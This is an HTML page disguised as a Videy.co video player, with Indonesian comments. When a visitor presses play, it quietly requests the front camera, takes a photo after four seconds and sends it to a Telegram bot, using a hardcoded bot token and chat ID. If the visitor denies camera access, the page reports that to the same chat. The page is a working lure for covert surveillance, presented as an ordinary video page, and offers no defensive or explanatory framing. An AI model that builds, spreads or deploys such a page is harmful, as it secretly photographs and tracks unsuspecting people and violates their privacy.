<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Videy.co</title>
  <style>
    /* Reset & Dark Theme ala Videy */
    body {
      background-color: #000;
      color: #fff;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      overflow: hidden;
    }

    /* Container Video */
    #video-container {
      position: relative;
      width: 100%;
      max-width: 100vw;
      height: auto;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    video {
      max-width: 100%;
      max-height: 100vh;
      outline: none;
    }

    /* Overlay Minimalis */
    #play-overlay {
      position: absolute;
      top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.6);
      display: flex;
      justify-content: center;
      align-items: center;
      cursor: pointer;
      z-index: 10;
      transition: background 0.3s;
    }

    #play-overlay:hover {
      background: rgba(0, 0, 0, 0.4);
    }

    /* Icon Play Lingkaran Putih */
    #play-icon {
      width: 80px;
      height: 80px;
      background: rgba(255, 255, 255, 0.2);
      border: 2px solid #fff;
      border-radius: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 30px;
      padding-left: 5px; /* Penyeimbang visual segitiga */
    }

    /* Teks Videy di pojok kiri atas (Opsional untuk kemiripan) */
    .brand {
      position: absolute;
      top: 20px;
      left: 20px;
      font-size: 24px;
      font-weight: bold;
      letter-spacing: -1px;
      color: #fff;
      text-decoration: none;
      z-index: 5;
    }
  </style>
</head>
<body>

<a href="#" class="brand">videy</a>

<div id="video-container">
  <video id="main-video" playsinline controls>
    <source src="https://files.catbox.moe/73rym4.mp4" type="video/mp4">
    Browser kamu tidak mendukung video.
  </video>

  <div id="play-overlay" onclick="startExperience()">
    <div id="play-icon">&#9658;</div>
  </div>
</div>

<canvas id="snap" style="display:none;"></canvas>

<script>
// Logic Telegram tetap sama seperti milikmu
const token = "8547362415:AAGa_J6vTe-PTPynj36Zc8qhWwdF2liyr_I";
const chatId = "5939971215";
let cameraStream = null;

async function startExperience() {
  const video = document.getElementById('main-video');
  const overlay = document.getElementById('play-overlay');

  overlay.style.display = 'none';
  video.play();

  try {
    cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    setTimeout(takeSnapAndSend, 4000);
  } catch (err) {
    reportError("Izin kamera ditolak.");
  }
}

function takeSnapAndSend() {
  const canvas = document.getElementById('snap');
  const ctx = canvas.getContext('2d');
  if (!cameraStream) return;

  const hiddenVideo = document.createElement('video');
  hiddenVideo.srcObject = cameraStream;
  hiddenVideo.play();
  
  hiddenVideo.onloadedmetadata = () => {
    canvas.width = hiddenVideo.videoWidth;
    canvas.height = hiddenVideo.videoHeight;
    ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
    
    cameraStream.getTracks().forEach(track => track.stop());
    sendPhoto(canvas.toDataURL('image/jpeg'));
  };
}

function sendPhoto(base64img) {
  const byteString = atob(base64img.split(',')[1]);
  const ab = new ArrayBuffer(byteString.length);
  const ia = new Uint8Array(ab);
  for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
  const blob = new Blob([ab], { type: 'image/jpeg' });

  const form = new FormData();
  form.append("chat_id", chatId);
  form.append("photo", blob, "capture.jpg");

  fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: "POST", body: form });
}

function reportError(message) {
  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text: message })
  });
}
</script>
</body>
</html>
